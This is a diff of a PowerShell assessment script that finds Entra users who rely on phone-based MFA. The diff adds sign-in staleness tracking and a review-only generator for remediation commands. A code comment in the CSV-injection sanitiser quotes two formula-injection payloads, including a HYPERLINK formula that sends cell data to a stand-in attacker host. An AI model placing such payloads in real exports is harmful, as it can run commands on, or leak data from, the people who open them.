@@ -150,6 +150,12 @@ param(
     [Parameter()]
     [switch]$SkipLegacyPerUserMfa,
 
+    # Writes a .ps1 of remediation commands beside the CSVs, for review and manual running.
+    # The assessment still writes nothing to any tenant: this produces a file, and the file
+    # refuses to run until a person reads it and deletes a throw at the top.
+    [Parameter()]
+    [switch]$ExportFixScript,
+
     # Regular expressions matched against the UPN. A user who matches is marked Excluded
     # and drops out of every count, the action list, the tickets, and the report.
     #
@@ -251,6 +257,18 @@ $script:GraphBeta = 'https://graph.microsoft.com/beta'
 $script:PerUserMfaNotChecked = '(not checked)'
 $script:PerUserMfaUnreadable = '(unreadable)'
 
+# Same rule as PerUserMfaState: never blank. An empty cell in a spreadsheet column called
+# DaysSinceLastSignIn reads as zero, which is the opposite of what no data means.
+# Not '(never)': Microsoft keeps interactive sign-in history back to April 2020 only, so
+# an absent record means "never, or not since April 2020". Both are six years idle and
+# treated the same here, but the column should not assert the stronger claim.
+$script:SignInAgeNever = '(none recorded)'
+$script:SignInAgeUnavailable = '(not available)'
+
+# Past this, an account on a work queue is more likely a missed leaver than a person to
+# chase. Not a hard rule and not used to drop anybody -- it only annotates and counts.
+$script:StaleSignInDays = 90
+
 # Group display names are resolved once and reused; the same exclusion group is commonly
 # referenced by both the SMS and voice method configurations.
 $script:GroupNameCache = @{}
@@ -279,6 +297,64 @@ Install it for the current user with:
 '@
     }
     Import-Module Microsoft.Graph.Authentication -ErrorAction Stop
+}
+
+function Test-RowFlag {
+    # Whether a row's boolean-ish column is true, for a row that may have been through a CSV.
+    #
+    # [bool] is the trap. `[bool]'False'` is $true, because a non-empty string is truthy --
+    # so `[bool]$_.BlockedAtRetirement` was correct on an in-memory row and silently always
+    # true on the same row imported from a CSV, which made the blocked-users-first sort a
+    # no-op for anyone piping an exported file back in. Comparing the string form works for
+    # both, since [string]$true is 'True'.
+    param([AllowNull()]$Value)
+    return ([string]$Value) -eq 'True'
+}
+
+function Get-SignInAgeSortKey {
+    # Days as a number for ordering, or int.MaxValue for any marker.
+    #
+    # Parsed rather than type-tested. The same row is an int in memory and a string once it
+    # has been through a CSV, so `-is [int]` sorted the two paths differently and the
+    # published sample stopped matching what the function generates -- a drift the samples
+    # test exists to catch, and did.
+    param([AllowNull()]$Value)
+
+    $parsed = 0
+    if ([int]::TryParse([string]$Value, [ref]$parsed)) { return $parsed }
+    return [int]::MaxValue
+}
+
+function Get-SignInAge {
+    <#
+    .SYNOPSIS
+        Whole days since a user last signed in, or a marker saying why there is no number.
+    .DESCRIPTION
+        Answers the question a technician asks first about a name on a work queue: is this
+        a person, or an account nobody has used since a leaver process missed it. A row
+        saying "last signed in 400 days ago" is a deprovisioning ticket, not a passkey one.
+
+        lastSuccessfulSignInDateTime is preferred over lastSignInDateTime because the
+        latter records attempts, including failures, so a locked-out ex-employee whose old
+        phone keeps retrying looks active. Falls back to it when the newer property is
+        absent, since Microsoft did not backfill it.
+    #>
+    param(
+        [AllowNull()]$SignInActivity,
+        [Parameter(Mandatory)][datetime]$Now
+    )
+
+    # Graph omits signInActivity entirely for a user with no recorded sign-in, so an absent
+    # object here is an answer rather than a gap -- the caller handles the real gap, which
+    # is the tenant not being licensed to report sign-in activity at all.
+    if ($null -eq $SignInActivity) { return $script:SignInAgeNever }
+
+    $stamp = Get-PropertyValue $SignInActivity 'lastSuccessfulSignInDateTime'
+    if (-not $stamp) { $stamp = Get-PropertyValue $SignInActivity 'lastSignInDateTime' }
+    if (-not $stamp) { return $script:SignInAgeNever }
+
+    try { $when = [datetime]$stamp } catch { return $script:SignInAgeUnavailable }
+    return [int][math]::Max(0, ($Now - $when.ToUniversalTime()).TotalDays)
 }
 
 function Resolve-TenantIdentifier {
@@ -1454,11 +1530,16 @@ function New-ActionList {
         Where-Object { $_.Risk -in @('Critical', 'High', 'Moderate') } |
         Sort-Object `
             @{ Expression = { $order[[string]$_.Risk] }; Ascending = $true }, `
-            @{ Expression = { [bool]$_.BlockedAtRetirement }; Descending = $true }, `
-            @{ Expression = { [bool]$_.IsAdmin }; Descending = $true }, `
+            @{ Expression = { Test-RowFlag (Get-PropertyValue $_ 'BlockedAtRetirement') }; Descending = $true }, `
+            @{ Expression = { Test-RowFlag (Get-PropertyValue $_ 'IsAdmin') }; Descending = $true }, `
+            # Recently active first. An account nobody has signed into for a year is a
+            # deprovisioning ticket, and it should not sit above a person at the top of
+            # somebody's queue. Non-numeric markers sort last, which is where they belong.
+            @{ Expression = { Get-SignInAgeSortKey (Get-PropertyValue $_ 'DaysSinceLastSignIn') }; Ascending = $true }, `
             @{ Expression = { [string]$_.DisplayName }; Ascending = $true } |
-        Select-Object Risk, BlockedAtRetirement, DisplayName, UserPrincipalName, IsAdmin,
-            PhoneMethodsRegistered, IsPasswordlessCapable, NextStep, UserId)
+        Select-Object Risk, BlockedAtRetirement, DaysSinceLastSignIn, DisplayName,
+            UserPrincipalName, IsAdmin, PhoneMethodsRegistered, IsPasswordlessCapable,
+            NextStep, UserId)
 }
 
 function Get-TicketNextStep {
@@ -1791,6 +1872,128 @@ $sample
     }
 }
 
+function New-RemediationScript {
+    <#
+    .SYNOPSIS
+        Writes a PowerShell script of remediation commands for a human to review and run.
+    .DESCRIPTION
+        This assessment does not write to a tenant, and this function does not change that:
+        it produces a file. Nothing in it executes here, and the file it writes does nothing
+        until somebody opens it, reads it, and runs it themselves.
+
+        That boundary is deliberate rather than timid. The central remediation cannot be
+        automated at all -- there is no Graph call that registers a passkey for somebody,
+        because registration requires the user present with their device. What can be
+        automated is the supporting cast, and the order it goes in is the whole point:
+
+            1. Issue a Temporary Access Pass, so the user can register a passkey WITHOUT
+               the phone they are about to lose. Skipping this is what strands people.
+            2. The user registers. A human step, and the script says so and stops.
+            3. Verify the new method exists.
+            4. Only then remove the phone method.
+
+        Every generated block is commented in that order, with the removal commented out.
+        Removing a phone method before a replacement is confirmed working is precisely the
+        lockout this entire tool exists to prevent, so the one destructive line in the file
+        is the one line that will not run until a person deletes a comment marker.
+    #>
+    param(
+        [Parameter(Mandatory)][AllowEmptyCollection()][object[]]$Rows,
+        [Parameter(Mandatory)][string]$Path,
+        [string]$Customer,
+        [Parameter(Mandatory)][string]$GeneratedFrom
+    )
+
+    $targets = @($Rows | Where-Object { $_.Risk -in @('Critical', 'High', 'Moderate') })
+
+    $label = if ([string]::IsNullOrWhiteSpace($Customer)) { 'this tenant' } else { $Customer }
+    $lines = [System.Collections.Generic.List[string]]::new()
+
+    [void]$lines.Add('<#')
+    [void]$lines.Add("    Remediation commands for $label, generated from:")
+    [void]$lines.Add("      $GeneratedFrom")
+    [void]$lines.Add('')
+    [void]$lines.Add('    THIS FILE HAS NOT BEEN RUN. It was written by a read-only assessment that does')
+    [void]$lines.Add('    not modify tenants. Read it before you run any of it.')
+    [void]$lines.Add('')
+    [void]$lines.Add('    The order below matters more than the commands do. A passkey cannot be')
+    [void]$lines.Add('    registered for somebody by any API -- the user has to be present -- so each')
+    [void]$lines.Add('    block issues a Temporary Access Pass first, which is what lets them register')
+    [void]$lines.Add('    without the phone they are about to lose. The line that removes the phone is')
+    [void]$lines.Add('    commented out on purpose: removing it before a replacement is confirmed is the')
+    [void]$lines.Add('    exact lockout the assessment exists to prevent.')
+    [void]$lines.Add('')
+    [void]$lines.Add('    Permissions these need are WRITE permissions, well beyond the read-only set')
+    [void]$lines.Add('    the assessment used:')
+    [void]$lines.Add('      UserAuthenticationMethod.ReadWrite.All   TAP issuance, phone removal')
+    [void]$lines.Add('      Policy.ReadWrite.AuthenticationMethod    per-user MFA state')
+    [void]$lines.Add('#>')
+    [void]$lines.Add('')
+    [void]$lines.Add('#Requires -Version 7.0')
+    [void]$lines.Add('#Requires -Modules Microsoft.Graph.Authentication')
+    [void]$lines.Add('')
+    [void]$lines.Add('Set-StrictMode -Version Latest')
+    [void]$lines.Add("$" + "ErrorActionPreference = 'Stop'")
+    [void]$lines.Add('')
+    [void]$lines.Add('throw ''Read this script, delete this throw, then run the blocks you want. It will not run as generated.''')
+    [void]$lines.Add('')
+    [void]$lines.Add('# Connect-MgGraph -Scopes UserAuthenticationMethod.ReadWrite.All, Policy.ReadWrite.AuthenticationMethod')
+    [void]$lines.Add('')
+
+    if ($targets.Count -eq 0) {
+        [void]$lines.Add('# No user in an actionable band. Nothing to remediate.')
+    }
+
+    foreach ($row in $targets) {
+        $upn = [string](Get-PropertyValue $row 'UserPrincipalName')
+        $id = [string](Get-PropertyValue $row 'UserId')
+        # Via Get-PropertyValue, not direct access: under StrictMode a property the row
+        # shape does not carry throws, and this function is reachable with either the full
+        # assessment row or the narrower action-list row. That mistake has crashed this
+        # script three times now.
+        $age = [string](Get-PropertyValue $row 'DaysSinceLastSignIn')
+        $legacyState = [string](Get-PropertyValue $row 'PerUserMfaState')
+
+        [void]$lines.Add('# ---------------------------------------------------------------------------')
+        [void]$lines.Add("# $([string](Get-PropertyValue $row 'DisplayName'))  <$upn>")
+        [void]$lines.Add("#   Risk $([string](Get-PropertyValue $row 'Risk')); blocked at retirement: $([string](Get-PropertyValue $row 'BlockedAtRetirement')); last sign-in: $age")
+        [void]$lines.Add("#   Phone methods: $([string](Get-PropertyValue $row 'PhoneMethodsRegistered'))")
+
+        # A stale account is a different ticket, and saying so here saves somebody
+        # scheduling a call with a person who left.
+        if ($age -eq $script:SignInAgeNever -or ($age -as [int]) -ge $script:StaleSignInDays) {
+            [void]$lines.Add('#   STALE. Confirm this account still belongs to somebody before doing any of this.')
+            [void]$lines.Add('#   A dormant account is a deprovisioning ticket, not a passkey one.')
+        }
+
+        if ($legacyState -in @('enabled', 'enforced')) {
+            [void]$lines.Add("#   In legacy per-user MFA ($legacyState). Convert first, or the")
+            [void]$lines.Add('#   registration campaign will never reach them.')
+            [void]$lines.Add("# Invoke-MgGraphRequest -Method PATCH -Uri 'https://graph.microsoft.com/beta/users/$id/authentication/requirements' -Body @{ perUserMfaState = 'disabled' }")
+        }
+
+        [void]$lines.Add('# 1. Temporary Access Pass, so they can register without the phone.')
+        [void]$lines.Add("# Invoke-MgGraphRequest -Method POST -Uri 'https://graph.microsoft.com/v1.0/users/$id/authentication/temporaryAccessPassMethods' -Body @{ isUsableOnce = `$false; lifetimeInMinutes = 480 }")
+        [void]$lines.Add('# 2. The user registers a passkey at https://aka.ms/mysecurityinfo. Human step.')
+        [void]$lines.Add('# 3. Confirm the new method exists before touching the old one.')
+        [void]$lines.Add("# Invoke-MgGraphRequest -Method GET -Uri 'https://graph.microsoft.com/v1.0/users/$id/authentication/methods'")
+        [void]$lines.Add('# 4. LAST. Only after step 3 shows a surviving method.')
+        [void]$lines.Add("#    List, then delete by the id it returns:")
+        [void]$lines.Add("# Invoke-MgGraphRequest -Method GET -Uri 'https://graph.microsoft.com/v1.0/users/$id/authentication/phoneMethods'")
+        [void]$lines.Add("# Invoke-MgGraphRequest -Method DELETE -Uri 'https://graph.microsoft.com/v1.0/users/$id/authentication/phoneMethods/<id-from-above>'")
+        [void]$lines.Add('')
+    }
+
+    $content = ($lines -join [Environment]::NewLine)
+    $directory = Split-Path -Parent $Path
+    if ($directory -and -not (Test-Path -LiteralPath $directory)) {
+        New-Item -ItemType Directory -Path $directory -Force | Out-Null
+    }
+    Set-Content -LiteralPath $Path -Value $content -Encoding utf8
+    if (-not $SkipAclHardening) { Protect-OutputFile -Path $Path }
+    return (Resolve-Path -LiteralPath $Path).Path
+}
+
 function Protect-CsvInjection {
     # CSV/formula injection. A display name of "=cmd|'/c calc'!A1" or
     # "=HYPERLINK(""http://attacker/""&A1,""Click"")" executes when the report is opened in
@@ -1865,6 +2068,10 @@ function Export-AssessmentCsv {
 
 Assert-GraphDependency
 
+# One clock for the run. Calling Get-Date per row would measure a 300-user tenant's first
+# and last rows against different instants, which is a silly way to get an off-by-one.
+$assessmentStartUtc = (Get-Date).ToUniversalTime()
+
 # Normalise before connecting, so a sign-in name becomes the tenant it belongs to rather
 # than an error from Graph that names neither the problem nor the fix.
 $TenantId = Resolve-TenantIdentifier -Value $TenantId
@@ -1872,7 +2079,25 @@ $TenantId = Resolve-TenantIdentifier -Value $TenantId
 $graphContext = Connect-AssessmentGraph
 
 Write-Host 'Reading enabled users (members and guests)...' -ForegroundColor Cyan
-$users = Get-GraphCollection -Uri "$script:GraphBase/users?`$select=id,displayName,userPrincipalName,userType,accountEnabled&`$top=999"
+
+# signInActivity is asked for so a work queue can distinguish a person from an account a
+# leaver process missed. Two constraints come with it, both from Microsoft's own docs:
+# selecting it caps the page size at 500 rather than 999, and it needs Entra ID P1 or P2.
+#
+# A tenant without that licensing must still get an assessment, so the whole query falls
+# back to the plain one rather than failing. Losing the staleness column is a smaller loss
+# than losing the run, and every row then says so rather than reading as "signed in today".
+$userSelect = 'id,displayName,userPrincipalName,userType,accountEnabled'
+$signInActivityAvailable = $true
+try {
+    $users = Get-GraphCollection -Uri "$script:GraphBase/users?`$select=$userSelect,signInActivity&`$top=500"
+}
+catch {
+    $signInActivityAvailable = $false
+    Write-Warning "Sign-in activity could not be read, so account staleness is unavailable: $($_.Exception.Message)"
+    Write-Warning 'This usually means the tenant lacks Entra ID P1/P2. The assessment continues; DaysSinceLastSignIn will read (not available).'
+    $users = Get-GraphCollection -Uri "$script:GraphBase/users?`$select=$userSelect&`$top=999"
+}
 $enabledUsers = @($users | Where-Object { (Get-PropertyValue $_ 'accountEnabled') -eq $true })
 if ($enabledUsers.Count -eq 0) { throw 'No enabled users were returned. Verify the signed-in account has User.Read.All.' }
 
@@ -2000,6 +2225,10 @@ $rows = foreach ($user in $enabledUsers) {
     $isAdmin = if ($registration) { [bool](Get-PropertyValue $registration 'isAdmin') } else { $false }
     $userType = [string](Get-PropertyValue $user 'userType')
 
+    $signInAge = if ($signInActivityAvailable) {
+        Get-SignInAge -SignInActivity (Get-PropertyValue $user 'signInActivity') -Now $assessmentStartUtc
+    } else { $script:SignInAgeUnavailable }
+
     # Three states with three meanings, and they must not collapse into each other:
     # not asked for, asked for but unanswered, and a real verdict.
     $perUserMfaState = if ($SkipLegacyPerUserMfa) { $script:PerUserMfaNotChecked }
@@ -2052,7 +2281,7 @@ $rows = foreach ($user in $enabledUsers) {
     # is stated in the column somebody actually reads.
     $allMethods = if ($registration) { ($methods -join '; ') } else { $script:NoReportRowMarker }
 
-    # Fifteen columns, chosen so the file is readable in Excel. The registration report
+    # Sixteen columns, chosen so the file is readable in Excel. The registration report
     # also returns isMfaCapable, isMfaRegistered, systemPreferredAuthenticationMethods and
     # a per-row timestamp; none of them changed what anybody did with the file, and the
     # evidence age is still reported once, as OldestReportRowUtc in the summary.
@@ -2072,6 +2301,7 @@ $rows = foreach ($user in $enabledUsers) {
         InSmsPolicyScope      = $inSmsScope
         InVoicePolicyScope    = $inVoiceScope
         PerUserMfaState       = $perUserMfaState
+        DaysSinceLastSignIn   = $signInAge
         PhoneMethodsRegistered = $phoneMethodList
         AllMethodsRegistered  = $allMethods
         IsPasswordlessCapable = $isPasswordlessCapable
@@ -2137,7 +2367,7 @@ $unresolvedTargets = @($smsScope.UnresolvedTargets) + @($voiceScope.UnresolvedTa
 
 $summary = [PSCustomObject][ordered]@{
     TenantId                   = $graphContext.TenantId
-    AssessmentTimeUtc          = (Get-Date).ToUniversalTime().ToString('o')
+    AssessmentTimeUtc          = $assessmentStartUtc.ToString('o')
     DirectoryUsersReturned     = $users.Count
     EnabledUsersAssessed       = $enabledUsers.Count
     UsersSkippedNotEnabled     = $usersSkippedNotEnabled
@@ -2174,6 +2404,17 @@ $summary = [PSCustomObject][ordered]@{
     UsersExcludedByPattern     = @($rows | Where-Object Risk -eq 'Excluded').Count
     ExcludeUpnPattern          = (@($ExcludeUpnPattern) -join ' | ')
     UsersMissingFromReport     = @($rows | Where-Object { $_.AllMethodsRegistered -eq $script:NoReportRowMarker }).Count
+    # How much of the work queue is probably not a person. Counted over the actionable
+    # bands only, because that is the list somebody has to work through.
+    StaleAccountsInActionList  = @($candidateRows | Where-Object {
+            $_.Risk -in @('Critical', 'High', 'Moderate') -and
+            (Get-SignInAgeSortKey $_.DaysSinceLastSignIn) -ge $script:StaleSignInDays -and
+            (Get-SignInAgeSortKey $_.DaysSinceLastSignIn) -ne [int]::MaxValue
+        }).Count
+    NeverSignedInInActionList  = @($candidateRows | Where-Object {
+            $_.Risk -in @('Critical', 'High', 'Moderate') -and
+            $_.DaysSinceLastSignIn -eq $script:SignInAgeNever
+        }).Count
     OldestReportRowUtc         = if ($reportTimestamps.Count -gt 0) { ($reportTimestamps | Sort-Object | Select-Object -First 1) } else { $null }
     OutputPath                 = (Resolve-Path -LiteralPath $OutputPath).Path
 }
@@ -2195,6 +2436,16 @@ $actionListRows = New-ActionList -Rows $rows
 Export-AssessmentCsv -Data $actionListRows -Path $actionListPath
 $summary | Add-Member -NotePropertyName ActionListPath -NotePropertyValue (Resolve-Path -LiteralPath $actionListPath).Path
 Write-Host "Action list ($($actionListRows.Count) users, attach this to a ticket): $actionListPath" -ForegroundColor Green
+
+if ($ExportFixScript) {
+    $fixPath = [System.IO.Path]::ChangeExtension($OutputPath, $null).TrimEnd('.') + '_Remediation.ps1'
+    # Full rows, not the action list: the action list is deliberately narrow and does not
+    # carry PerUserMfaState. The function filters to the actionable bands itself.
+    $written = New-RemediationScript -Rows $rows -Path $fixPath -Customer $CustomerName `
+        -GeneratedFrom (Resolve-Path -LiteralPath $OutputPath).Path
+    $summary | Add-Member -NotePropertyName FixScriptPath -NotePropertyValue $written
+    Write-Host "Remediation commands (review before running; nothing has been run): $written" -ForegroundColor Green
+}
 
 if ($HtmlReport) {
     $htmlPath = [System.IO.Path]::ChangeExtension($OutputPath, 'html')
@@ -2232,13 +2483,25 @@ if ($ExportTickets) {
     }
 }
 
+# The headline, stated as people rather than rows. A run against a real tenant produced
+# twenty-four rows, a nine-user action list, and two people who actually lose their
+# sign-in -- and nothing on screen said which number was which.
+Write-Host ''
 if ($summary.BlockedAtRetirement -gt 0) {
     $adminNote = if ($summary.BlockedAdminsAtRetirement -gt 0) { " $($summary.BlockedAdminsAtRetirement) of them privileged." } else { '' }
-    Write-Host "`n$($summary.BlockedAtRetirement) user(s) hold a phone number as their ONLY method that satisfies MFA.$adminNote" -ForegroundColor Red
-    Write-Host 'These are the accounts stopped at sign-in on 2027-02-01 until they register a passkey. Drive this to zero.' -ForegroundColor Red
+    Write-Host "$($summary.BlockedAtRetirement) user(s) lose their sign-in on 2027-02-01. A phone is their only method that satisfies MFA.$adminNote" -ForegroundColor Red
+    Write-Host 'This is the number to drive to zero. Everything else is posture.' -ForegroundColor Red
 }
 else {
-    Write-Host "`nNo user holds a phone number as their only method that satisfies MFA. Nobody is stopped at sign-in on 2027-02-01 on current data." -ForegroundColor Green
+    Write-Host 'Nobody loses their sign-in on 2027-02-01: no user holds a phone as their only method that satisfies MFA.' -ForegroundColor Green
+}
+
+# Immediately after, because it changes how long the queue really is.
+if ($summary.StaleAccountsInActionList -gt 0 -or $summary.NeverSignedInInActionList -gt 0) {
+    $parts = @()
+    if ($summary.StaleAccountsInActionList -gt 0) { $parts += "$($summary.StaleAccountsInActionList) not signed in for $($script:StaleSignInDays)+ days" }
+    if ($summary.NeverSignedInInActionList -gt 0) { $parts += "$($summary.NeverSignedInInActionList) never signed in" }
+    Write-Host "Of the action list, $($parts -join ' and '). Check those against your leaver process before chasing anybody." -ForegroundColor Yellow
 }
 if ($summary.UsersExcludedByPattern -gt 0) {
     Write-Host "$($summary.UsersExcludedByPattern) user(s) excluded by -ExcludeUpnPattern and left out of every count. They remain in the CSV marked Excluded; check the pattern did not catch a real person." -ForegroundColor Cyan
@@ -2270,12 +2533,10 @@ if ($summary.LegacyPerUserMfaUnreadable -gt 0) {
     Write-Host "$($summary.LegacyPerUserMfaUnreadable) user(s) returned no readable per-user MFA state. They are marked (unreadable), not clean; re-run before treating this tenant as assessed." -ForegroundColor Yellow
 }
 
-Write-Host "`n2026-09-01  Users in SMS/voice scope auto-enabled for passkeys; registration campaign set to Microsoft managed." -ForegroundColor Yellow
-Write-Host '2026-10-30  Customer-managed telecom providers can first be configured via the Microsoft Security Store.' -ForegroundColor Yellow
-Write-Host '2027-02-01  Microsoft-provided SMS/voice delivery retired. No opt-out. Also the deadline to have a customer-managed telecom provider configured.' -ForegroundColor Red
-Write-Host 'Interpretation: Critical/High rows deserve validation first; Moderate rows may reveal legacy per-user MFA exposure.' -ForegroundColor Yellow
+Write-Host "`n2026-09-01  Passkey auto-enablement and registration nudge begins." -ForegroundColor Yellow
+Write-Host '2027-02-01  SMS and voice retired. No opt-out.' -ForegroundColor Red
 Write-Host 'Passkey deployment guide: https://aka.ms/passkey-deployment-guide' -ForegroundColor Cyan
-Write-Host 'No tenant settings were changed.' -ForegroundColor Green
+Write-Host 'Read-only run. No tenant settings were changed.' -ForegroundColor Green
 
 # Last, so the header sits directly above the summary it introduces. Every Write-Host
 # above has already reached the host by the time the returned object renders.
